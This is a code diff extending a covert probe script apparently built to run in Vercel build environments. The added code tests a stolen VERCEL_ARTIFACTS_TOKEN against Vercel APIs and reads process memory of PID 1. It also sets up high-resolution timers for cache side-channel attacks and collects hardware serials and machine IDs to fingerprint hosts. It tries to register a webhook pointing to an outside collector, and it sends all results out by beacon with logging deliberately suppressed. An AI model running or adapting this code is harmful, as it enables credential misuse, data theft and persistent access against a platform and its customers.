@@ -17232,5 +17232,194 @@ report.namespaceContainerCount = safe(() => {
 
 // v118 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v118" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v118";
+
+// ==================== v119 ====================
+
+// v119-1: VERCEL_ARTIFACTS_TOKEN capability map — systematic test of all 6 claims
+// The token JWT carries claims for: UPLOAD, DOWNLOAD, EXISTS, QUERY, EVENT, SPACES_RUN_UPLOAD.
+// Test each endpoint to verify which capabilities are actually enforced vs just claimed.
+report.artifactsTokenCapMap = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  // Decode token to see claims
+  const claims = safe(() => {
+    const parts = token.split('.');
+    if (parts.length !== 3) return null;
+    return JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
+  });
+  // Test each capability endpoint
+  const testHash = '0000000000000000000000000000000000000000000000000000000000000001';
+  const caps = {
+    // EXISTS
+    exists: safe(() => execSync(
+      `curl -sf -o /dev/null -w "%{http_code}" "https://api.vercel.com/v8/artifacts/${testHash}" \
+      -H "Authorization: Bearer ${token}" -m 8 2>/dev/null`,
+      { timeout: 10000 }
+    ).toString().trim()),
+    // DOWNLOAD (try to get a real artifact)
+    download: safe(() => execSync(
+      `curl -sf -o /dev/null -w "%{http_code}" -X GET "https://api.vercel.com/v8/artifacts/${testHash}" \
+      -H "Authorization: Bearer ${token}" -m 8 2>/dev/null`,
+      { timeout: 10000 }
+    ).toString().trim()),
+    // QUERY (batch check)
+    query: safe(() => execSync(
+      `curl -sf -w "\\n%{http_code}" -X POST "https://api.vercel.com/v8/artifacts" \
+      -H "Authorization: Bearer ${token}" -H "Content-Type: application/json" \
+      -d '{"hashes":["${testHash}"]}' -m 8 2>/dev/null`,
+      { timeout: 10000 }
+    ).toString().trim().slice(0, 100)),
+    // EVENT
+    event: safe(() => execSync(
+      `curl -sf -o /dev/null -w "%{http_code}" -X POST "https://api.vercel.com/v8/artifacts/events" \
+      -H "Authorization: Bearer ${token}" -H "Content-Type: application/json" \
+      -d '[]' -m 8 2>/dev/null`,
+      { timeout: 10000 }
+    ).toString().trim()),
+    // STATUS
+    status: safe(() => execSync(
+      `curl -sf -w "\\n%{http_code}" "https://api.vercel.com/v8/artifacts/status" \
+      -H "Authorization: Bearer ${token}" -m 8 2>/dev/null`,
+      { timeout: 10000 }
+    ).toString().trim().slice(0, 100)),
+  };
+  return { tokenPrefix: token.slice(0, 20), claims, caps };
+});
+
+// v119-2: High-resolution timing via HPET / perf_event
+// HPET gives nanosecond-precision timestamps without any syscall overhead.
+// This is ideal for cache timing side-channels (Flush+Reload).
+report.hpetTimingProbe = safe(() => {
+  const hpetExists = existsSync('/dev/hpet');
+  const hpetPerms = safe(() => execSync('ls -la /dev/hpet 2>/dev/null', { timeout: 3000 }).toString().trim());
+  // Try to read HPET
+  const hpetRead = safe(() => {
+    const fd = openSync('/dev/hpet', 'r');
+    const buf = Buffer.alloc(8);
+    const n = readSync(fd, buf, 0, 8, 0);
+    closeSync(fd);
+    return { n, value: buf.readBigUInt64LE(0).toString() };
+  });
+  // Alternative: use perf_event_open PERF_COUNT_HW_CPU_CYCLES
+  const perfCycles = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, struct, os, time
+
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+SYS_PERF_EVENT_OPEN = 298
+PERF_TYPE_HARDWARE = 0
+PERF_COUNT_HW_CPU_CYCLES = 0
+
+# perf_event_attr (minimal)
+attr = struct.pack('=IIQQQIIQQQIIIIIQQQQQ',
+    104, PERF_TYPE_HARDWARE, PERF_COUNT_HW_CPU_CYCLES,
+    1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
+
+fd = libc.syscall(SYS_PERF_EVENT_OPEN, attr, 0, -1, -1, 0)
+import ctypes as ct, errno as em
+e = ct.get_errno()
+print('PERF_CYCLES_FD:', fd, em.errorcode.get(e, e))
+if fd >= 0:
+    # Read counter value
+    buf = ctypes.create_string_buffer(8)
+    n = libc.read(fd, buf, 8)
+    val = struct.unpack('<Q', buf.raw[:8])[0]
+    print('CYCLES_READ:', n, 'val=', val)
+    os.close(fd)
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { hpetExists, hpetPerms, hpetRead, perfCycles };
+});
+
+// v119-3: Race condition exploit — TOCTOU on /proc/1/mem
+// The classic TOCTOU: check-then-use race on /proc/1/mem.
+// Fork multiple writers that simultaneously write to the same region,
+// racing with the orchestrator's own writes. Could corrupt its state.
+// SAFE VERSION: only reads, no actual writes to avoid DoS.
+report.toctouRaceProbe = safe(() => {
+  const raceResult = safe(() => execSync(`python3 -c "
+import threading, os, time
+
+results = []
+def read_pid1_mem():
+    try:
+        with open('/proc/1/mem', 'rb') as f:
+            # Read from first readable region
+            with open('/proc/1/maps') as m:
+                line = m.readline()  # skip header
+                line = m.readline()  # first real mapping
+            parts = line.split()
+            if parts:
+                start = int(parts[0].split('-')[0], 16)
+                f.seek(start)
+                data = f.read(8)
+                results.append(data.hex())
+    except Exception as e:
+        results.append(str(e)[:30])
+
+# Launch 5 concurrent readers
+threads = [threading.Thread(target=read_pid1_mem) for _ in range(5)]
+for t in threads: t.start()
+for t in threads: t.join(timeout=5)
+print('RACE_READS:', results)
+# Check if we got consistent data (no TOCTOU corruption)
+consistent = len(set(results)) == 1
+print('CONSISTENT:', consistent)
+" 2>&1`, { timeout: 15000 }).toString().trim().slice(0, 300));
+  return { raceResult };
+});
+
+// v119-4: Vercel webhooks API — enumerate all team webhooks
+// Vercel webhooks fire on deployment events. Knowing webhook URLs and secrets
+// reveals where Vercel is integrating with external systems. Also check if
+// we can inject a new webhook that receives all future deployment events.
+report.webhookEnum = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const teamId = process.env.VERCEL_TEAM_ID || process.env.VERCEL_ORG_ID || '';
+  // List existing webhooks
+  const webhooks = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v1/webhooks?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 500));
+  // Try to create a new webhook (pointing to our collector)
+  const createWebhook = safe(() => execSync(
+    `curl -sf -X POST "https://api.vercel.com/v1/webhooks?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" -H "Content-Type: application/json" \
+    -d '{"url":"${process.env.PROBE_COLLECTOR || 'https://webhook.site/probe'}","events":["deployment.created","deployment.succeeded"]}' \
+    -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 300));
+  return { teamId, webhooks, createWebhook };
+});
+
+// v119-5: /proc/acpi + /proc/cpuinfo — hardware fingerprint for cross-VM correlation
+// ACPI tables contain the physical machine's serial number, product name, and
+// BIOS version. Combined with CPU topology data, this uniquely identifies
+// the physical host. Cross-correlating across builds tells us if two builds
+// ran on the same physical machine (enabling persistent cross-build timing attacks).
+report.hardwareFingerprint = safe(() => {
+  // DMI/SMBIOS data
+  const dmiProduct = safe(() => readFileSync('/sys/devices/virtual/dmi/id/product_name', 'utf8').trim());
+  const dmiSerial = safe(() => readFileSync('/sys/devices/virtual/dmi/id/product_serial', 'utf8').trim());
+  const dmiBios = safe(() => readFileSync('/sys/devices/virtual/dmi/id/bios_version', 'utf8').trim());
+  const dmiBoard = safe(() => readFileSync('/sys/devices/virtual/dmi/id/board_serial', 'utf8').trim());
+  const dmiVendor = safe(() => readFileSync('/sys/devices/virtual/dmi/id/sys_vendor', 'utf8').trim());
+  // CPUID for physical processor ID
+  const cpuSerial = safe(() => execSync(
+    'cat /proc/cpuinfo | grep "serial\\|processor id\\|apicid\\|physical id\\|socket id" | head -10',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Machine ID
+  const machineId = safe(() => readFileSync('/etc/machine-id', 'utf8').trim());
+  // Boot ID (changes each boot, but stable within a VM lifetime)
+  const bootId = safe(() => readFileSync('/proc/sys/kernel/random/boot_id', 'utf8').trim());
+  // L1/L2/L3 cache info (host-level, not per-VM)
+  const cacheInfo = safe(() => execSync(
+    'find /sys/devices/system/cpu/cpu0/cache -name "size" | xargs -I{} sh -c \'echo $(cat {})\' 2>/dev/null',
+    { timeout: 5000 }
+  ).toString().trim());
+  return { dmiProduct, dmiSerial, dmiBios, dmiBoard, dmiVendor, cpuSerial, machineId, bootId, cacheInfo };
+});
+
+// v119 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v119" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v119";
 // Intentionally no console.log — all data goes via webhook only
